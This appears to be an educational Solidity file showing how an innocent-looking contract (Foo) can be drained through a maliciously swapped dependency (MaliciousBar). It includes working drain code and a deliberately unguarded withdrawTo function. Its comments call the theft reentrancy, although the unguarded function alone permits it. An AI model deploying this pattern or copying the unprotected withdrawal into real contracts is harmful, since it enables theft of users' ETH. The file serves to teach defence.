// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/// @title HidingMaliciousCode
/// @notice Demonstrates how malicious logic can be hidden via external contracts
/// @dev Educational example - DO NOT USE IN PRODUCTION
///
/// Attack pattern:
/// 1. Attacker deploys MaliciousBar (implements IBar interface)
/// 2. Attacker deploys Foo, passing MaliciousBar's address as the "bar" dependency
/// 3. Users review Foo's code — it looks innocent, just calls bar.log()
/// 4. Users also see the IBar interface — looks harmless
/// 5. But the DEPLOYED Bar is actually MaliciousBar, which steals ETH via reentrancy
///
/// Prevention:
/// - Always verify the deployed bytecode of external contract dependencies
/// - Use well-known, audited contract addresses
/// - Be suspicious of constructor-injected addresses
/// - Prefer immutable, hardcoded addresses for critical dependencies

/// @title IBar - the interface that looks harmless
/// @notice A simple logging interface
interface IBar {
    function log(address caller) external;
}

/// @title Bar - a legitimate implementation of IBar
/// @notice Actually does harmless logging
contract Bar is IBar {
    event Log(address indexed caller, uint256 timestamp);

    /// @notice Logs the caller address — completely harmless
    function log(address caller) external {
        emit Log(caller, block.timestamp);
    }
}

/// @title MaliciousBar - implements IBar but steals ETH via reentrancy
/// @notice Looks like Bar from the interface, but re-enters Foo to drain ETH
/// @dev The function signature matches IBar.log() exactly, so Foo cannot
///      distinguish between Bar and MaliciousBar at the interface level.
contract MaliciousBar is IBar {
    address public immutable attacker;

    event Log(address indexed caller, uint256 timestamp);

    constructor() {
        attacker = msg.sender;
    }

    /// @notice Appears to be a harmless log, but re-enters Foo to drain ETH
    function log(address) external {
        // Emit the same event as Bar to look identical in logs
        emit Log(msg.sender, block.timestamp);

        // The malicious part: drain the calling contract's ETH
        uint256 balance = msg.sender.balance;
        if (balance > 0) {
            // Call Foo's withdraw function to steal its ETH
            IFoo(msg.sender).withdrawTo(attacker);
        }
    }
}

/// @title IFoo - interface for reentrancy target
interface IFoo {
    function withdrawTo(address to) external;
}

/// @title Foo - an innocent-looking contract that depends on an external Bar
/// @notice Calls bar.log() which could be legitimate or malicious
/// @dev The danger: Foo's code looks completely safe on its own.
///      The vulnerability comes from what Bar implementation is actually deployed.
contract Foo {
    IBar public immutable bar;
    mapping(address => uint256) public balances;

    event ActionPerformed(address indexed user);
    event Deposited(address indexed user, uint256 amount);
    event Withdrawn(address indexed to, uint256 amount);

    constructor(address _bar) {
        bar = IBar(_bar);
    }

    /// @notice Deposit ETH into the contract
    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposited(msg.sender, msg.value);
    }

    /// @notice Perform an action that calls the external bar.log()
    /// @dev This looks innocent, but if bar is MaliciousBar, the callback can
    ///      call withdrawTo and drain the contract's ETH.
    function doSomething() external {
        emit ActionPerformed(msg.sender);
        // This external call is where the hidden attack happens
        bar.log(msg.sender);
    }

    /// @notice Withdraw contract ETH to a specified address (called internally or by bar)
    /// @dev Vulnerable: no access control — MaliciousBar can call this
    function withdrawTo(address to) external {
        uint256 balance = address(this).balance;
        if (balance > 0) {
            (bool success,) = to.call{value: balance}("");
            require(success);
            emit Withdrawn(to, balance);
        }
    }

    /// @notice Accept ETH deposits
    receive() external payable {}
}
